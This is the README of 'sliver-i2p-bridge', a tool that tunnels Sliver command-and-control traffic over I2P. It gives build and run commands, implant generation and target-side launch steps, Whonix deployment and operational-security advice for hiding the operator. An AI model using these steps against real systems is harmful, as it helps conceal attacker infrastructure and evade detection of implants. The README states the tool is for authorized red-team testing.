QuickestRound14's shit (vibe coded) Sliver edit. Made for personal use.

# sliver-i2p-bridge

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?logo=go)](https://go.dev/)

**I2P transport bridge for Sliver C2** — Anonymous command and control through the Invisible Internet Project.

> ⚠️ **For authorized security testing only.** This tool is intended for red team operations, penetration testing, and security research with proper authorization.

## What It Does

Creates an I2P hidden destination that forwards traffic to Sliver's HTTPS listener. Implants connect through I2P, you control them through Sliver normally.

```
┌──────────────┐      ┌─────────────────┐      ┌─────────────┐      ┌──────────────┐
│    Sliver    │◄────►│ sliver-i2p-     │◄────►│ I2P Network │◄────►│   Implant    │
│    Server    │      │ bridge          │      │             │      │              │
│   (:8443)    │      │ (SAM:7656)      │      │ (garlic)    │      │ (HTTP proxy) │
└──────────────┘      └─────────────────┘      └─────────────┘      └──────────────┘
```

## Why Use This

- **Your C2 server IP stays hidden** — implants only know the `.b32.i2p` address
- **Works with stock Sliver** — no framework modifications needed
- **I2P advantages over Tor:**
  - Better partition resistance (distributed hash table)
  - Designed for hidden services (garlic routing)
  - Less scrutinized than Tor exit nodes
- **Whonix-ready** — designed for high-security deployments
- **Single binary** — no Python dependencies, just Go

## Quick Start

### Prerequisites

- Go 1.21+
- I2P router with SAM bridge enabled (port 7656)
- Sliver C2 framework

### Build

```bash
git clone https://github.com/QuickestRound/sliver-i2p-bridge.git
cd sliver-i2p-bridge
go build -o sliver-i2p-bridge ./cmd/sliver-i2p-bridge
```

Or cross-compile for Linux:
```bash
make linux
```

### Usage

**1. Start I2P router and enable SAM:**
```bash
# Install I2P
sudo apt install i2p

# Enable SAM bridge in /var/lib/i2p/i2p-config/clients.config:
# clientApp.3.startOnLoad=true

# Start I2P
sudo systemctl start i2p

# Wait for bootstrap (~2-5 minutes)
# Check http://127.0.0.1:7657 for status
```

**2. Start Sliver with HTTPS listener:**
```bash
sliver-server
sliver > https -L 127.0.0.1 -l 8443
```

**3. Start the bridge:**
```bash
./sliver-i2p-bridge start --sliver-port 8443
```

Output:
```
[*] sliver-i2p-bridge starting...
[*] Sliver target: 127.0.0.1:8443
[*] SAM bridge: 127.0.0.1:7656
[+] I2P session established!
[+] B32 Address: abcdef1234567890...b32.i2p
[+] Bridge is READY!

[*] Generate implant with:
    sliver > generate --http http://abcdef1234567890.b32.i2p --os linux
```

**4. Generate and deploy implant:**
```bash
# In Sliver
sliver > generate --http http://<B32_ADDRESS>.b32.i2p --os linux --save implant

# On target (must have I2P with HTTP proxy)
HTTP_PROXY=http://127.0.0.1:4444 ./implant
```

## CLI Reference

```
sliver-i2p-bridge start [OPTIONS]
  --sliver-host    Sliver HTTPS listener host (default: 127.0.0.1)
  --sliver-port    Sliver HTTPS listener port (default: 8443)
  --sam-host       I2P SAM bridge host (default: 127.0.0.1)
  --sam-port       I2P SAM bridge port (default: 7656)
  --persist-keys   Use persistent destination keys
  --key-path       Path to destination key file (default: destination.keys)

sliver-i2p-bridge keygen [OPTIONS]
  --output         Output path for generated keys

sliver-i2p-bridge status
  Check SAM bridge connectivity

sliver-i2p-bridge stop
  Signal running bridge to shutdown (use Ctrl+C)
```

## Whonix Deployment

For maximum anonymity, run on Whonix-Workstation:

```bash
# Copy to Whonix
scp -r sliver-i2p-bridge user@whonix-ws:~/

# Run installer
ssh user@whonix-ws
cd sliver-i2p-bridge
chmod +x scripts/install-whonix.sh
./scripts/install-whonix.sh
```

**Whonix notes:**
- I2P traffic routes through Tor first (Tor → I2P), adding latency but increasing anonymity
- I2P does NOT support stream isolation — restart I2P between sensitive operations
- Use generous beacon intervals (30s+) to account for latency

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    OPERATOR MACHINE                             │
│  ┌─────────────┐   ┌────────────────────┐   ┌───────────────┐  │
│  │   Sliver    │   │  sliver-i2p-bridge │   │  I2P Router   │  │
│  │   Server    │◄─►│                    │◄─►│  (SAM:7656)   │  │
│  │  (:8443)    │   │  - SAM session     │   │               │  │
│  │             │   │  - TLS forwarding  │   │  Creates:     │  │
│  │             │   │  - Key management  │   │  .b32.i2p     │  │
│  └─────────────┘   └────────────────────┘   └───────┬───────┘  │
└─────────────────────────────────────────────────────┼──────────┘
                                                      │
                        I2P NETWORK                   │
                ┌─────────────────────────────────────┴──────────┐
                │  ┌─────┐    ┌─────┐    ┌─────┐    ┌─────┐     │
                │  │Hop 1│───►│Hop 2│───►│Hop 3│───►│Hop 4│     │
                │  └─────┘    └─────┘    └─────┘    └─────┘     │
                │         Garlic Encrypted Tunnels              │
                └─────────────────────────────────────┬──────────┘
                                                      │
┌─────────────────────────────────────────────────────┼──────────┐
│                    TARGET MACHINE                   │          │
│  ┌───────────────────┐    ┌──────────────────────┐ │          │
│  │   I2P Client      │◄───┤   Sliver Implant     │ │          │
│  │  (HTTP proxy      │    │   HTTP_PROXY=:4444   │ │          │
│  │   :4444)          │    │                      │ │          │
│  └───────────────────┘    └──────────────────────┘ │          │
└─────────────────────────────────────────────────────────────────┘
```

## Security Considerations

| Consideration | Recommendation |
|--------------|----------------|
| Key Storage | Protect `destination.keys` with 0600 permissions |
| No Clearnet | Implants should ONLY connect via I2P, no fallback |
| Stream Isolation | I2P doesn't support it — run separate instances for separate ops |
| Beacon Interval | Set to 30s+ to handle I2P latency |
| OPSEC | Never generate/test implants from your real IP |

## Comparison: I2P vs Tor for C2

| Feature | I2P | Tor |
|---------|-----|-----|
| Hidden Service Design | Primary use case (garlic routing) | Secondary (onion services) |
| Network Size | Smaller (~30k nodes) | Larger (~7k relays) |
| Latency | Higher (2-5s) | Lower (1-2s) |
| Partition Resistance | Better (DHT-based) | Good |
| Exit Nodes | Not applicable (internal only) | Heavily monitored |
| Detection Profile | Less common, lower scrutiny | Well-known, more scrutiny |

## Troubleshooting

**SAM Connection Failed:**
```
failed to connect to SAM at 127.0.0.1:7656
```
- Verify I2P is running: `systemctl status i2p`
- Check SAM is enabled in I2P config
- Wait for I2P to finish bootstrapping (check console at :7657)

**Slow/No Connections:**
- I2P bootstrap takes 5-10 minutes on first start
- First connection after start is always slowest
- Check I2P console for tunnel health

**Implant Not Connecting:**
- Verify target has I2P with HTTP proxy on :4444
- Check `HTTP_PROXY` is set correctly
- Ensure implant was generated with correct B32 address

## Contributing

PRs welcome! Please:
1. Fork the repo
2. Create a feature branch
3. Test your changes
4. Submit a PR with clear description

## License

MIT — see [LICENSE](LICENSE)

## Credits

- Inspired by [sliver-tor-bridge](https://github.com/Otsmane-Ahmed/sliver-tor-bridge)
- Built with [go-sam-go](https://github.com/go-i2p/go-sam-go) SAM library
- For use with [Sliver C2](https://github.com/BishopFox/sliver) by BishopFox

---

**Disclaimer:** This tool is provided for authorized security testing and research purposes only. Users are responsible for ensuring they have proper authorization before using this tool. The authors are not responsible for misuse.
